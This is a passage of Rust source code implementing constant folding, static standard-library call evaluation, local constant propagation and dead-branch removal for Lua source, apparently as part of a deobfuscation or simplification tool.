}

fn eval_binary(op: &str, left: &ConstValue, right: &ConstValue) -> Option<ConstValue> {
    if op == "and" { return Some(if left.truthy() { right.clone() } else { left.clone() }); }
    if op == "or" { return Some(if left.truthy() { left.clone() } else { right.clone() }); }
    match op {
        "==" => return Some(ConstValue::Bool(value_eq(left, right))),
        "~=" => return Some(ConstValue::Bool(!value_eq(left, right))),
        "<" | ">" | "<=" | ">=" => {
            let cmp = match (left, right) {
                (ConstValue::Number(a), ConstValue::Number(b)) => a.partial_cmp(b),
                (ConstValue::String(a), ConstValue::String(b)) => Some(a.cmp(b)),
                _ => None,
            }?;
            let result = match op {
                "<" => cmp.is_lt(), ">" => cmp.is_gt(), "<=" => !cmp.is_gt(), ">=" => !cmp.is_lt(), _ => false,
            };
            return Some(ConstValue::Bool(result));
        }
        ".." => {
            let mut result = concat_bytes(left)?;
            result.extend_from_slice(&concat_bytes(right)?);
            return Some(ConstValue::String(result));
        }
        "|" | "~" | "&" | "<<" | ">>" => {
            let a = integer_value(left)? as u32;
            let b = integer_value(right)? as u32;
            let result = match op {
                "|" => a | b,
                "~" => a ^ b,
                "&" => a & b,
                "<<" => a.wrapping_shl(b & 31),
                ">>" => a.wrapping_shr(b & 31),
                _ => return None,
            };
            return Some(ConstValue::Number(result as i32 as f64));
        }
        _ => {}
    }
    let a = left.as_number()?;
    let b = right.as_number()?;
    let value = match op {
        "+" => a + b,
        "-" => a - b,
        "*" => a * b,
        "/" if b != 0.0 => a / b,
        "//" if b != 0.0 => (a / b).floor(),
        "%" if b != 0.0 => a - (a / b).floor() * b,
        "^" => a.powf(b),
        _ => return None,
    };
    if value.is_finite() { Some(ConstValue::Number(value)) } else { None }
}

fn parse_primary(
    source: &str,
    tokens: &[Token],
    pos: &mut usize,
    limit: usize,
    depth: usize,
) -> Option<ExprNode> {
    if *pos >= limit || depth > 128 { return None; }
    let index = *pos;
    let token = &tokens[index];

    if token.text == "(" {
        *pos += 1;
        let inner = parse_expr_bp(source, tokens, pos, limit, 1, depth + 1)?;
        if *pos >= limit || tokens[*pos].text != ")" {
            return Some(ExprNode {
                start: index, end: inner.end, value: None, has_operator: inner.has_operator,
                children: vec![inner],
            });
        }
        *pos += 1;
        return Some(ExprNode {
            start: index, end: *pos, value: inner.value.clone(), has_operator: inner.has_operator,
            children: vec![inner],
        });
    }

    if matches!(token.text.as_str(), "not" | "-" | "+" | "~" | "#") {
        let op = token.text.clone();
        *pos += 1;
        let min_prec = if op == "not" { 3 } else { 11 };
        let operand = parse_expr_bp(source, tokens, pos, limit, min_prec, depth + 1)?;
        let value = operand.value.as_ref().and_then(|v| eval_unary(&op, v));
        return Some(ExprNode {
            start: index, end: operand.end, value, has_operator: true, children: vec![operand],
        });
    }

    *pos += 1;
    let value = constant_from_token(source, token);
    Some(ExprNode {
        start: index, end: index + 1, value, has_operator: false, children: Vec::new(),
    })
}

fn parse_expr_bp(
    source: &str,
    tokens: &[Token],
    pos: &mut usize,
    limit: usize,
    min_prec: u8,
    depth: usize,
) -> Option<ExprNode> {
    if depth > 128 { return None; }
    let mut left = parse_primary(source, tokens, pos, limit, depth + 1)?;
    loop {
        if *pos >= limit { break; }
        let Some((precedence, right_associative)) = binary_precedence(&tokens[*pos].text) else { break; };
        if precedence < min_prec { break; }
        let op = tokens[*pos].text.clone();
        *pos += 1;
        let rhs_min = if right_associative { precedence } else { precedence + 1 };
        let right = match parse_expr_bp(source, tokens, pos, limit, rhs_min, depth + 1) {
            Some(value) => value,
            None => break,
        };
        let value = match (left.value.as_ref(), right.value.as_ref()) {
            (Some(a), Some(b)) => eval_binary(&op, a, b),
            _ => None,
        };
        let start = left.start;
        let end = right.end;
        left = ExprNode {
            start, end, value, has_operator: true, children: vec![left, right],
        };
    }
    Some(left)
}

fn eval_constant_range(source: &str, tokens: &[Token], start: usize, end: usize) -> Option<ConstValue> {
    if start >= end || end > tokens.len() { return None; }
    let mut pos = start;
    let node = parse_expr_bp(source, tokens, &mut pos, end, 1, 0)?;
    if pos == end { node.value } else { None }
}

#[derive(Clone)]
struct Edit {
    start: usize,
    end: usize,
    replacement: String,
}

fn apply_edits(source: &str, mut edits: Vec<Edit>) -> (String, usize) {
    if edits.is_empty() { return (source.to_string(), 0); }
    edits.sort_by(|a, b| a.start.cmp(&b.start).then_with(|| b.end.cmp(&a.end)));
    let mut output = String::with_capacity(source.len());
    let mut cursor = 0usize;
    let mut applied = 0usize;
    for edit in edits {
        if edit.start < cursor || edit.end > source.len() || edit.start > edit.end { continue; }
        if !source.is_char_boundary(edit.start) || !source.is_char_boundary(edit.end) { continue; }
        output.push_str(&source[cursor..edit.start]);
        output.push_str(&edit.replacement);
        cursor = edit.end;
        applied += 1;
    }
    output.push_str(&source[cursor..]);
    (output, applied)
}

fn collect_constant_edits(node: &ExprNode, source: &str, tokens: &[Token], edits: &mut Vec<Edit>) {
    if node.has_operator {
        if let Some(value) = node.value.as_ref() {
            if node.start < node.end && node.end <= tokens.len() {
                edits.push(Edit {
                    start: tokens[node.start].start,
                    end: tokens[node.end - 1].end,
                    replacement: value.to_lua(),
                });
                return;
            }
        }
    }
    for child in &node.children { collect_constant_edits(child, source, tokens, edits); }
}

fn fold_constant_expressions(source: &str) -> (String, usize) {
    let tokens = lex_source(source);
    let mut edits = Vec::new();
    let mut i = 0usize;
    while i < tokens.len() {
        let mut pos = i;
        if let Some(node) = parse_expr_bp(source, &tokens, &mut pos, tokens.len(), 1, 0) {
            if pos > i {
                collect_constant_edits(&node, source, &tokens, &mut edits);
                i = pos.max(i + 1);
                continue;
            }
        }
        i += 1;
    }
    apply_edits(source, edits)
}

fn find_matching_token(tokens: &[Token], open: usize, opener: &str, closer: &str) -> Option<usize> {
    if open >= tokens.len() || tokens[open].text != opener { return None; }
    let mut depth = 0usize;
    for i in open..tokens.len() {
        if tokens[i].text == opener { depth += 1; }
        else if tokens[i].text == closer {
            depth = depth.checked_sub(1)?;
            if depth == 0 { return Some(i); }
        }
    }
    None
}

fn split_arguments(tokens: &[Token], start: usize, end: usize) -> Vec<(usize, usize)> {
    if start >= end { return Vec::new(); }
    let mut args = Vec::new();
    let mut begin = start;
    let mut paren = 0i32;
    let mut square = 0i32;
    let mut brace = 0i32;
    for i in start..end {
        match tokens[i].text.as_str() {
            "(" => paren += 1, ")" => paren -= 1,
            "[" => square += 1, "]" => square -= 1,
            "{" => brace += 1, "}" => brace -= 1,
            "," if paren == 0 && square == 0 && brace == 0 => {
                args.push((begin, i));
                begin = i + 1;
            }
            _ => {}
        }
    }
    if begin < end { args.push((begin, end)); }
    args
}

fn bounded_lua_index(index: i64, len: usize, is_start: bool) -> usize {
    let len_i = len.min(i64::MAX as usize) as i64;
    let raw = if index < 0 { len_i + index + 1 } else { index };
    let clamped = if is_start { raw.clamp(1, len_i + 1) } else { raw.clamp(0, len_i) };
    if is_start { (clamped - 1).max(0) as usize } else { clamped.max(0) as usize }
}

fn bit32_arg(value: &ConstValue) -> Option<u32> {
    let n = value.as_number()?;
    if !n.is_finite() { return None; }
    Some(n.trunc().rem_euclid(4_294_967_296.0) as u32)
}

fn number_to_text(value: f64) -> Option<Vec<u8>> {
    if !value.is_finite() { return None; }
    Some(ConstValue::Number(value).to_lua().into_bytes())
}

fn parse_base_number(bytes: &[u8], base: u32) -> Option<f64> {
    if !(2..=36).contains(&base) { return None; }
    let text = std::str::from_utf8(bytes).ok()?.trim();
    if text.is_empty() { return None; }
    let (negative, digits) = if let Some(rest) = text.strip_prefix('-') {
        (true, rest)
    } else if let Some(rest) = text.strip_prefix('+') {
        (false, rest)
    } else {
        (false, text)
    };
    if digits.is_empty() { return None; }
    let mut value = 0.0f64;
    for ch in digits.chars() {
        let digit = ch.to_digit(base)?;
        value = value * base as f64 + digit as f64;
        if !value.is_finite() { return None; }
    }
    Some(if negative { -value } else { value })
}

fn format_static_string(format: &[u8], args: &[ConstValue]) -> Option<Vec<u8>> {
    let mut out = Vec::new();
    let mut i = 0usize;
    let mut arg = 0usize;
    while i < format.len() {
        if format[i] != b'%' {
            out.push(format[i]);
            i += 1;
            continue;
        }
        i += 1;
        if i >= format.len() { return None; }
        if format[i] == b'%' {
            out.push(b'%');
            i += 1;
            continue;
        }

        let left_align = format[i] == b'-';
        if matches!(format[i], b'-' | b'+' | b' ' | b'#' | b'0') {
            // Only left alignment and zero-padding are unambiguous to implement
            // locally; reject other printf flags instead of guessing.
            if matches!(format[i], b'+' | b' ' | b'#') { return None; }
            i += 1;
        }
        let mut width = 0usize;
        while i < format.len() && format[i].is_ascii_digit() {
            width = width.saturating_mul(10).saturating_add((format[i] - b'0') as usize);
            if width > 256 { return None; }
            i += 1;
        }
        let mut precision = None;
        if i < format.len() && format[i] == b'.' {
            i += 1;
            let mut p = 0usize;
            let mut digits = 0usize;
            while i < format.len() && format[i].is_ascii_digit() {
                p = p.saturating_mul(10).saturating_add((format[i] - b'0') as usize);
                if p > 256 { return None; }
                digits += 1;
                i += 1;
            }
            precision = Some(if digits == 0 { 0 } else { p });
        }
        if i >= format.len() || arg >= args.len() { return None; }
        let spec = format[i];
        i += 1;
        let value = &args[arg];
        arg += 1;

        let mut piece = match spec {
            b's' => {
                let mut bytes = match value {
                    ConstValue::String(s) => s.clone(),
                    _ => return None,
                };
                if let Some(p) = precision { bytes.truncate(p); }
                bytes
            }
            b'q' => match value {
                ConstValue::String(s) => quote_lua_bytes(s).into_bytes(),
                _ => return None,
            },
            b'c' => {
                let n = value.as_number()?;
                if !n.is_finite() || n.fract() != 0.0 || !(0.0..=255.0).contains(&n) { return None; }
                vec![n as u8]
            }
            b'd' | b'i' | b'u' | b'x' | b'X' | b'o' => {
                let n = value.as_number()?;
                if !n.is_finite() || n.fract() != 0.0 || n < i64::MIN as f64 || n > i64::MAX as f64 { return None; }
                let integer = n as i64;
                match spec {
                    b'd' | b'i' => integer.to_string().into_bytes(),
                    b'u' => (integer as u32).to_string().into_bytes(),
                    b'x' => format!("{:x}", integer as u32).into_bytes(),
                    b'X' => format!("{:X}", integer as u32).into_bytes(),
                    b'o' => format!("{:o}", integer as u32).into_bytes(),
                    _ => return None,
                }
            }
            b'f' => {
                let n = value.as_number()?;
                if !n.is_finite() { return None; }
                format!("{:.*}", precision.unwrap_or(6), n).into_bytes()
            }
            _ => return None,
        };

        if piece.len() < width {
            let pad = width - piece.len();
            let pad_byte = if !left_align && format[..i].contains(&b'0') && !format[..i].contains(&b'.') { b'0' } else { b' ' };
            let mut padded = Vec::with_capacity(width);
            if left_align {
                padded.extend_from_slice(&piece);
                padded.extend(std::iter::repeat(pad_byte).take(pad));
            } else {
                padded.extend(std::iter::repeat(pad_byte).take(pad));
                padded.extend_from_slice(&piece);
            }
            piece = padded;
        }
        out.extend_from_slice(&piece);
        if out.len() > 65536 { return None; }
    }
    if arg != args.len() { return None; }
    Some(out)
}

fn fold_extended_static_call(namespace: &str, function_name: &str, args: &[ConstValue]) -> Option<ConstValue> {
    if namespace == "string" {
        match function_name {
            "lower" if args.len() == 1 => {
                let value = args[0].as_string()?;
                return Some(ConstValue::String(value.iter().map(u8::to_ascii_lowercase).collect()));
            }
            "upper" if args.len() == 1 => {
                let value = args[0].as_string()?;
                return Some(ConstValue::String(value.iter().map(u8::to_ascii_uppercase).collect()));
            }
            "len" if args.len() == 1 => {
                return Some(ConstValue::Number(args[0].as_string()?.len() as f64));
            }
            "format" if !args.is_empty() => {
                return format_static_string(args[0].as_string()?, &args[1..]).map(ConstValue::String);
            }
            _ => {}
        }
    }

    if namespace == "math" {
        let numbers: Option<Vec<f64>> = args.iter().map(ConstValue::as_number).collect();
        let numbers = numbers?;
        let value = match function_name {
            "floor" if numbers.len() == 1 => numbers[0].floor(),
            "ceil" if numbers.len() == 1 => numbers[0].ceil(),
            "abs" if numbers.len() == 1 => numbers[0].abs(),
            "sqrt" if numbers.len() == 1 && numbers[0] >= 0.0 => numbers[0].sqrt(),
            "sin" if numbers.len() == 1 => numbers[0].sin(),
            "cos" if numbers.len() == 1 => numbers[0].cos(),
            "tan" if numbers.len() == 1 => numbers[0].tan(),
            "rad" if numbers.len() == 1 => numbers[0].to_radians(),
            "deg" if numbers.len() == 1 => numbers[0].to_degrees(),
            "exp" if numbers.len() == 1 => numbers[0].exp(),
            "log" if numbers.len() == 1 && numbers[0] > 0.0 => numbers[0].ln(),
            "pow" if numbers.len() == 2 => numbers[0].powf(numbers[1]),
            "fmod" if numbers.len() == 2 && numbers[1] != 0.0 => numbers[0] % numbers[1],
            "min" if !numbers.is_empty() => numbers.iter().copied().fold(f64::INFINITY, f64::min),
            "max" if !numbers.is_empty() => numbers.iter().copied().fold(f64::NEG_INFINITY, f64::max),
            "clamp" if numbers.len() == 3 && numbers[1] <= numbers[2] => numbers[0].clamp(numbers[1], numbers[2]),
            _ => return None,
        };
        return value.is_finite().then_some(ConstValue::Number(value));
    }

    if namespace == "bit32" {
        let bits: Option<Vec<u32>> = args.iter().map(bit32_arg).collect();
        let bits = bits?;
        let result = match function_name {
            "band" if !bits.is_empty() => bits.iter().copied().fold(u32::MAX, |a, b| a & b),
            "bor" if !bits.is_empty() => bits.iter().copied().fold(0u32, |a, b| a | b),
            "bxor" if !bits.is_empty() => bits.iter().copied().fold(0u32, |a, b| a ^ b),
            "bnot" if bits.len() == 1 => !bits[0],
            "lshift" | "rshift" | "arshift" if args.len() == 2 => {
                let displacement = integer_value(&args[1])?;
                let n = bits[0];
                let shift = displacement.unsigned_abs().min(32) as u32;
                if displacement >= 0 {
                    match function_name {
                        "lshift" => n.wrapping_shl(shift),
                        "rshift" => n.wrapping_shr(shift),
                        _ => ((n as i32).wrapping_shr(shift)) as u32,
                    }
                } else {
                    match function_name {
                        "lshift" => n.wrapping_shr(shift),
                        "rshift" => n.wrapping_shl(shift),
                        _ => n.wrapping_shl(shift),
                    }
                }
            }
            "lrotate" if args.len() == 2 => {
                let displacement = integer_value(&args[1])?;
                bits[0].rotate_left(displacement.rem_euclid(32) as u32)
            }
            "rrotate" if args.len() == 2 => {
                let displacement = integer_value(&args[1])?;
                bits[0].rotate_right(displacement.rem_euclid(32) as u32)
            }
            "extract" if args.len() == 2 || args.len() == 3 => {
                let field = integer_value(&args[1])?;
                let width = if args.len() == 3 { integer_value(&args[2])? } else { 1 };
                if field < 0 || width <= 0 || width > 32 || field + width > 32 { return None; }
                let mask = if width == 32 { u32::MAX } else { (1u32 << width) - 1 };
                (bits[0] >> field) & mask
            }
            "replace" if args.len() == 3 || args.len() == 4 => {
                let value = bits[1];
                let field = integer_value(&args[2])?;
                let width = if args.len() == 4 { integer_value(&args[3])? } else { 1 };
                if field < 0 || width <= 0 || width > 32 || field + width > 32 { return None; }
                let mask = if width == 32 { u32::MAX } else { (1u32 << width) - 1 };
                let clear_mask = !(mask << field);
                (bits[0] & clear_mask) | ((value & mask) << field)
            }
            _ => return None,
        };
        return Some(ConstValue::Number(result as f64));
    }

    if namespace == "utf8" && function_name == "char" && !args.is_empty() {
        let mut output = String::new();
        for value in args {
            let number = value.as_number()?;
            if !number.is_finite() || number.fract() != 0.0 || number < 0.0 || number > 0x10ffff as f64 { return None; }
            output.push(char::from_u32(number as u32)?);
            if output.len() > 65536 { return None; }
        }
        return Some(ConstValue::String(output.into_bytes()));
    }

    if namespace.is_empty() && function_name == "tostring" && args.len() == 1 {
        return Some(match &args[0] {
            ConstValue::String(value) => ConstValue::String(value.clone()),
            ConstValue::Number(value) => ConstValue::String(number_to_text(*value)?),
            ConstValue::Bool(value) => ConstValue::String(value.to_string().into_bytes()),
            ConstValue::Nil => ConstValue::String(b"nil".to_vec()),
        });
    }

    if namespace.is_empty() && function_name == "tonumber" && (args.len() == 1 || args.len() == 2) {
        if args.len() == 2 {
            let base = integer_value(&args[1])?;
            if !(2..=36).contains(&base) { return Some(ConstValue::Nil); }
            return Some(match &args[0] {
                ConstValue::String(value) => parse_base_number(value, base as u32)
                    .filter(|n| n.is_finite()).map(ConstValue::Number).unwrap_or(ConstValue::Nil),
                _ => ConstValue::Nil,
            });
        }
        return Some(match &args[0] {
            ConstValue::Number(value) if value.is_finite() => ConstValue::Number(*value),
            ConstValue::String(value) => {
                let parsed = std::str::from_utf8(value).ok().map(str::trim).and_then(parse_number);
                parsed.map(ConstValue::Number).unwrap_or(ConstValue::Nil)
            }
            _ => ConstValue::Nil,
        });
    }
    None
}

fn fold_static_calls(source: &str) -> (String, usize) {
    let tokens = lex_source(source);
    let mut edits = Vec::new();
    let mut i = 0usize;
    while i + 1 < tokens.len() {
        // Recognize only whitelisted pure standard-library calls, and avoid
        // confusing object methods or names qualified by another namespace.
        if i > 0 && matches!(tokens[i - 1].text.as_str(), "." | ":") {
            i += 1;
            continue;
        }
        let namespace = tokens[i].text.as_str();
        let (call_namespace, function_name, open_index) =
            if matches!(namespace, "string" | "table" | "math" | "bit32" | "utf8")
                && i + 3 < tokens.len()
                && tokens[i + 1].text == "."
                && tokens[i + 2].kind == TokenKind::Ident
                && tokens[i + 3].text == "("
            {
                (namespace, tokens[i + 2].text.as_str(), i + 3)
            } else if matches!(namespace, "tonumber" | "tostring") && tokens[i + 1].text == "(" {
                ("", namespace, i + 1)
            } else {
                i += 1;
                continue;
            };

        let Some(close) = find_matching_token(&tokens, open_index, "(", ")") else { i += 1; continue; };
        let args = split_arguments(&tokens, open_index + 1, close);
        let static_values: Option<Vec<ConstValue>> = args.iter()
            .map(|(a, b)| eval_constant_range(source, &tokens, *a, *b))
            .collect();
        let mut result: Option<ConstValue> = static_values.as_ref()
            .and_then(|values| fold_extended_static_call(call_namespace, function_name, values));
        if result.is_none() {

        let namespace = call_namespace;
        if namespace == "string" && function_name == "char" {
            let mut bytes = Vec::new();
            let mut valid = true;
            for (a, b) in &args {
                match eval_constant_range(source, &tokens, *a, *b) {
                    Some(ConstValue::Number(n)) if n.is_finite() && n.fract() == 0.0 && (0.0..=255.0).contains(&n) => bytes.push(n as u8),
                    _ => { valid = false; break; }
                }
            }
            if valid && bytes.len() <= 65536 { result = Some(ConstValue::String(bytes)); }
        } else if namespace == "string" && function_name == "reverse" && args.len() == 1 {
            if let Some(ConstValue::String(mut value)) = eval_constant_range(source, &tokens, args[0].0, args[0].1) {
                value.reverse();
                result = Some(ConstValue::String(value));
            }
        } else if namespace == "string" && function_name == "sub" && (args.len() == 2 || args.len() == 3) {
            if let (Some(ConstValue::String(value)), Some(ConstValue::Number(first))) = (
                eval_constant_range(source, &tokens, args[0].0, args[0].1),
                eval_constant_range(source, &tokens, args[1].0, args[1].1),
            ) {
                let last = if args.len() == 3 {
                    match eval_constant_range(source, &tokens, args[2].0, args[2].1) {
                        Some(ConstValue::Number(v)) if v.is_finite() && v.fract() == 0.0 && v >= i64::MIN as f64 && v <= i64::MAX as f64 => v as i64,
                        _ => { i += 1; continue; }
                    }
                } else { value.len().min(i64::MAX as usize) as i64 };
                if first.is_finite() && first.fract() == 0.0 && first >= i64::MIN as f64 && first <= i64::MAX as f64 {
                    let a = bounded_lua_index(first as i64, value.len(), true).min(value.len());
                    let b = bounded_lua_index(last, value.len(), false).min(value.len());
                    result = Some(ConstValue::String(if b >= a { value[a..b].to_vec() } else { Vec::new() }));
                }
            }
        } else if namespace == "string" && function_name == "rep" && (args.len() == 2 || args.len() == 3) {
            let value = eval_constant_range(source, &tokens, args[0].0, args[0].1);
            let count = eval_constant_range(source, &tokens, args[1].0, args[1].1);
            let sep = if args.len() == 3 { eval_constant_range(source, &tokens, args[2].0, args[2].1) } else { Some(ConstValue::String(Vec::new())) };
            if let (Some(ConstValue::String(value)), Some(ConstValue::Number(n)), Some(ConstValue::String(sep))) = (value, count, sep) {
                if n.is_finite() && n.fract() == 0.0 && (0.0..=4096.0).contains(&n) {
                    let n = n as usize;
                    let total = value.len().saturating_mul(n).saturating_add(sep.len().saturating_mul(n.saturating_sub(1)));
                    if total <= 65536 {
                        let mut out = Vec::with_capacity(total);
                        for part in 0..n {
                            if part > 0 { out.extend_from_slice(&sep); }
                            out.extend_from_slice(&value);
                        }
                        result = Some(ConstValue::String(out));
                    }
                }
            }
        } else if namespace == "table" && function_name == "concat" && (args.len() == 1 || args.len() == 2) {
            let (table_start, table_end) = args[0];
            if table_end > table_start + 1 && tokens[table_start].text == "{" && tokens[table_end - 1].text == "}" {
                let entries = split_arguments(&tokens, table_start + 1, table_end - 1);
                let separator = if args.len() == 2 {
                    match eval_constant_range(source, &tokens, args[1].0, args[1].1) {
                        Some(ConstValue::String(s)) => s,
                        _ => { i += 1; continue; }
                    }
                } else { Vec::new() };
                let mut combined = Vec::new();
                let mut valid = true;
                for (entry_index, (a, b)) in entries.iter().enumerate() {
                    match eval_constant_range(source, &tokens, *a, *b).and_then(|v| concat_bytes(&v)) {
                        Some(value) => {
                            if entry_index > 0 { combined.extend_from_slice(&separator); }
                            combined.extend_from_slice(&value);
                        }
                        None => { valid = false; break; }
                    }
                }
                if valid && combined.len() <= 65536 { result = Some(ConstValue::String(combined)); }
            }
        }
        }

        if let Some(value) = result {
            edits.push(Edit {
                start: tokens[i].start,
                end: tokens[close].end,
                replacement: value.to_lua(),
            });
            i = close + 1;
        } else {
            i += 1;
        }
    }
    apply_edits(source, edits)
}

fn is_assignment_operator(value: &str) -> bool {
    matches!(value, "=" | "+=" | "-=" | "*=" | "/=" | "//=" | "%=" | "^=" | "..=" | "&=" | "|=" | "<<=" | ">>=")
}

fn is_scope_boundary(value: &str) -> bool {
    matches!(value, "if" | "elseif" | "else" | "while" | "for" | "function" | "do" | "repeat" | "end" | "until")
}

fn propagate_local_constants(source: &str) -> (String, usize) {
    let tokens = lex_source(source);
    let mut known: std::collections::HashMap<String, ConstValue> = std::collections::HashMap::new();
    let mut edits = Vec::new();

    for i in 0..tokens.len() {
        let token = &tokens[i];
        if token.kind == TokenKind::Ident && is_scope_boundary(&token.text) {
            known.clear();
            continue;
        }

        if token.text == "local" && i + 3 < tokens.len()
            && tokens[i + 1].kind == TokenKind::Ident && tokens[i + 2].text == "="
        {
            let name = tokens[i + 1].text.clone();
            known.remove(&name);
            let mut pos = i + 3;
            if let Some(node) = parse_expr_bp(source, &tokens, &mut pos, tokens.len(), 1, 0) {
                let suffix_is_call_or_index = pos < tokens.len()
                    && matches!(tokens[pos].text.as_str(), "(" | "[" | "." | ":");
                if !suffix_is_call_or_index {
                    if let Some(value) = node.value {
                        known.insert(name, value);
                    }
                }
            }
            continue;
        }

        if token.kind != TokenKind::Ident { continue; }
        if i > 0 && matches!(tokens[i - 1].text.as_str(), "." | ":" | "local" | "function") {
            continue;
        }
        let table_key = i + 1 < tokens.len() && tokens[i + 1].text == "="
            && i > 0 && matches!(tokens[i - 1].text.as_str(), "{" | ",");
        if table_key { continue; }

        let is_write = i + 1 < tokens.len() && is_assignment_operator(&tokens[i + 1].text);
        if is_write {
            known.remove(&token.text);
            continue;
        }

        if let Some(value) = known.get(&token.text) {
            edits.push(Edit {
                start: token.start,
                end: token.end,
                replacement: value.to_lua(),
            });
        }
    }
    apply_edits(source, edits)
}

fn fold_static_table_indices(source: &str) -> (String, usize) {
    let tokens = lex_source(source);
    let mut edits = Vec::new();

    for declaration in 0..tokens.len().saturating_sub(3) {
        if tokens[declaration].text != "local"
            || tokens[declaration + 1].kind != TokenKind::Ident
            || tokens[declaration + 2].text != "="
            || tokens[declaration + 3].text != "{"
        {
            continue;
        }

        let name = tokens[declaration + 1].text.clone();
        let Some(table_end) = find_matching_token(&tokens, declaration + 3, "{", "}") else {
            continue;
        };
        let entries = split_arguments(&tokens, declaration + 4, table_end);
        if entries.is_empty() || entries.len() > 4096 { continue; }

        let values: Option<Vec<ConstValue>> = entries.iter()
            .map(|(start, end)| eval_constant_range(source, &tokens, *start, *end))
            .collect();
        let Some(values) = values else { continue; };
        if values.len() > 4096 { continue; }

        // Refuse ambiguous shadowing: a second local with the same name can
        // change which table an indexed read refers to.
        let redeclared = (0..tokens.len()).any(|index| {
            index != declaration
                && tokens[index].text == "local"
                && index + 1 < tokens.len()
                && tokens[index + 1].kind == TokenKind::Ident
                && tokens[index + 1].text == name
        });
        if redeclared { continue; }

        let mut candidate_edits = Vec::new();
        let mut safe = true;
        let mut index = table_end + 1;
        while index < tokens.len() {
            if tokens[index].kind != TokenKind::Ident || tokens[index].text != name {
                index += 1;
                continue;
            }
            if index > 0 && matches!(tokens[index - 1].text.as_str(), "." | ":") {
                index += 1;
                continue;
            }
            // Ignore named keys in other table constructors, e.g. { values = 1 }.
            if index > 0 && matches!(tokens[index - 1].text.as_str(), "{" | ",")
                && index + 1 < tokens.len() && tokens[index + 1].text == "="
            {
                index += 1;
                continue;
            }

            if index + 1 >= tokens.len() || tokens[index + 1].text != "[" {
                safe = false;
                break;
            }
            let Some(close_index) = find_matching_token(&tokens, index + 1, "[", "]") else {
                safe = false;
                break;
            };

            // Indexed writes, chained bases, and method/call uses are not
            // substituted. This keeps the table's mutation/alias semantics intact.
            if close_index + 1 < tokens.len()
                && (is_assignment_operator(&tokens[close_index + 1].text)
                    || matches!(tokens[close_index + 1].text.as_str(), "(" | "[" | "." | ":"))
            {
                safe = false;
                break;
            }

            if let Some(ConstValue::Number(n)) =
                eval_constant_range(source, &tokens, index + 2, close_index)
            {
                if n.is_finite() && n.fract() == 0.0 && n >= 1.0 && n <= values.len() as f64 {
                    let slot = n as usize - 1;
                    candidate_edits.push(Edit {
                        start: tokens[index].start,
                        end: tokens[close_index].end,
                        replacement: values[slot].to_lua(),
                    });
                }
            }
            index = close_index + 1;
        }

        if safe { edits.extend(candidate_edits); }
    }

    apply_edits(source, edits)
}

#[derive(Clone, Copy, PartialEq)]
enum BlockKind { End, Until }

#[derive(Clone)]
struct IfBranch {
    condition: Option<(usize, usize)>,
    body_start: usize,
    body_end: usize,
}

fn find_then(tokens: &[Token], start: usize) -> Option<usize> {
    let mut paren = 0i32;
    let mut square = 0i32;
    let mut brace = 0i32;
    for i in start..tokens.len() {
        match tokens[i].text.as_str() {
            "(" => paren += 1, ")" => paren -= 1,
            "[" => square += 1, "]" => square -= 1,
            "{" => brace += 1, "}" => brace -= 1,
            "then" if paren == 0 && square == 0 && brace == 0 => return Some(i),
            _ => {}
        }
    }
    None
}

fn parse_if_branches(source: &str, tokens: &[Token], if_index: usize) -> Option<(usize, Vec<IfBranch>)> {
    let then_index = find_then(tokens, if_index + 1)?;
    let mut branches = vec![IfBranch {
        condition: Some((if_index + 1, then_index)),
        body_start: tokens[then_index].end,
        body_end: 0,
    }];
    let mut current = 0usize;
    let mut stack = vec![BlockKind::End];
    let mut i = then_index + 1;

    while i < tokens.len() {
        if stack.len() == 1 && tokens[i].text == "elseif" {
            branches[current].body_end = tokens[i].start;
            let next_then = find_then(tokens, i + 1)?;
            branches.push(IfBranch {
                condition: Some((i + 1, next_then)),
                body_start: tokens[next_then].end,
                body_end: 0,
            });
            current = branches.len() - 1;
            i = next_then + 1;
            continue;
        }
        if stack.len() == 1 && tokens[i].text == "else" {
            branches[current].body_end = tokens[i].start;
            branches.push(IfBranch {
                condition: None,
                body_start: tokens[i].end,
                body_end: 0,
            });
            current = branches.len() - 1;
            i += 1;
            continue;
        }

        match tokens[i].text.as_str() {
            "if" | "function" | "do" => stack.push(BlockKind::End),
            "repeat" => stack.push(BlockKind::Until),
            "end" => {
                if stack.last() == Some(&BlockKind::End) {
                    stack.pop();
                    if stack.is_empty() {
                        branches[current].body_end = tokens[i].start;
                        return Some((i, branches));
                    }
                }
            }
            "until" => {
                if stack.last() == Some(&BlockKind::Until) { stack.pop(); }
            }
            _ => {}
        }
        i += 1;
    }
    let _ = source;
    None
}

fn simplify_if_at(source: &str, tokens: &[Token], if_index: usize) -> Option<Edit> {
    let (end_index, branches) = parse_if_branches(source, tokens, if_index)?;
    let mut chosen: Option<usize> = None;
    let mut determined = true;
    for (index, branch) in branches.iter().enumerate() {
        match branch.condition {
            Some((start, end)) => match eval_constant_range(source, tokens, start, end) {
                Some(value) if value.truthy() => { chosen = Some(index); break; }
                Some(_) => {}
                None => { determined = false; break; }
            },
            None => { chosen = Some(index); break; }
        }
    }
    if !determined { return None; }
    let replacement = if let Some(index) = chosen {
        let branch = &branches[index];
        if branch.body_start <= branch.body_end {
            source[branch.body_start..branch.body_end].to_string()
        } else { String::new() }
    } else {
        let old = &source[tokens[if_index].start..tokens[end_index].end];
        old.chars().filter(|c| *c == '\n' || *c == '\r').collect()
    };
    Some(Edit {
        start: tokens[if_index].start,
        end: tokens[end_index].end,
        replacement,
    })
}

fn simplify_false_while_at(source: &str, tokens: &[Token], while_index: usize) -> Option<Edit> {
    let mut do_index = None;
    let mut paren = 0i32;
    let mut square = 0i32;
    let mut brace = 0i32;
    for i in while_index + 1..tokens.len() {
        match tokens[i].text.as_str() {
            "(" => paren += 1, ")" => paren -= 1,
            "[" => square += 1, "]" => square -= 1,
            "{" => brace += 1, "}" => brace -= 1,
            "do" if paren == 0 && square == 0 && brace == 0 => { do_index = Some(i); break; }
            _ => {}
        }
    }
    let do_index = do_index?;
    let condition = eval_constant_range(source, tokens, while_index + 1, do_index)?;
    if condition.truthy() { return None; }

    let mut stack = vec![BlockKind::End];
    for i in do_index + 1..tokens.len() {
        match tokens[i].text.as_str() {
            "if" | "function" | "do" => stack.push(BlockKind::End),
            "repeat" => stack.push(BlockKind::Until),
            "end" => {
                if stack.last() == Some(&BlockKind::End) {
                    stack.pop();
                    if stack.is_empty() {
                        let old = &source[tokens[while_index].start..tokens[i].end];
                        let replacement = old.chars().filter(|c| *c == '\n' || *c == '\r').collect();
                        return Some(Edit { start: tokens[while_index].start, end: tokens[i].end, replacement });
                    }
                }
            }
            "until" => {
                if stack.last() == Some(&BlockKind::Until) { stack.pop(); }
            }
            _ => {}
        }
    }
    None
}

